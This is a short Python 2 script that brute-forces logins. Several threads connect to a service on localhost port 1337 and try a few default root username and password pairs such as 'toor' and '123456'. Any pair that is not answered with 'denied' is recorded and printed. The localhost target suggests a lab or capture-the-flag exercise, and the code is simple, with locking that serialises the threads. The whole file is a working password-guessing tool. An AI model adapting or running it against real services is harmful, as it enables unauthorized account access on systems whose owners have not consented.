from threading import Thread, Lock
import Queue
import socket


def cracker(tn, q):
    while not exit_flag:
        queue_lock.acquire()
        if not work_queue.empty():
            u, p = q.get()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = ('localhost', 1337)

            sock.connect(server_address)
            sock.recv(1024)
            sock.send(u + "\n")
            sock.recv(1024)
            sock.send(p + "\n")
            result = sock.recv(1024).strip()

            if "denied" not in result:
                cracked.append((u, p, tn))
                sock.send("exit\n")

            sock.close()
            queue_lock.release()
        else:
            queue_lock.release()


class CrackerThread(Thread):
    def __init__(self, thread_id, name, q):
        Thread.__init__(self)
        self.id = thread_id
        self.name = name
        self.q = q

    def run(self):
        cracker(self.name, self.q)

if __name__ == "__main__":
    exit_flag = 0
    queue_lock = Lock()
    work_queue = Queue.Queue()
    threads = []
    thread_number = 5

    passwords = [("root", "1234"), ("root", "123456"), ("root", "toor")]
    cracked = []

    queue_lock.acquire()
    for password in passwords:
        work_queue.put(password)
    queue_lock.release()

    for i in range(thread_number):
        thread_name = "Thread-{}".format(i)
        thread = CrackerThread(i, thread_name, work_queue)
        thread.start()
        threads.append(thread)

    while not work_queue.empty():
        if cracked:
            exit_flag = 1

    exit_flag = 1
    for thread in threads:
        thread.join()

    if cracked:
        for username, password, thread_name in cracked:
            print "[*] username = {0:8} | password = {1:8} | {2:8}".format(username, password, thread_name)
    else:
        print "[!] Not cracked."